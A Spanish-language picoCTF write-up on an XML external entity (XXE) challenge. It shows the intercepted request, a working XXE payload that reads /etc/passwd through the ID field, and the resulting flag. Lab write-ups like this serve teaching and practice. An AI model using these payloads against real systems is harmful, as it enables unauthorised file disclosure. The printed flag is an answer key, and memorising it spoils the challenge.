## Descripción
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

[Web Portal](http://saturn.picoctf.net:63695/)

Pistas:
1. XML external entity Injection
## Solución

```
Para esto, deberemos de tener configurado un proxy y un interceptador de llamadas como BurpSuite, al entrar al interceptador encontraremos:

html
<?xml version="1.0" encoding="UTF-8"?>
	<data>
		<ID>
			2
		</ID>
	</data>
Ahora, podemos realizar un ataque reemplazando la etiqueta xml con lo siguiente:
html
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

Y realizar el ataque con la siguiente petición:

html
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
	<data>
		<ID>
			&xxe;
		</ID>
	</data>
dandonos como resultado la flag correspondiente:
picoCTF{XML_3xtern@l_3nt1t1ty_0dcf926e}
	
	
```


## Notas adicionales
## Referencias
https://www.youtube.com/watch?v=b1pGlutUL34&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=67&t=112s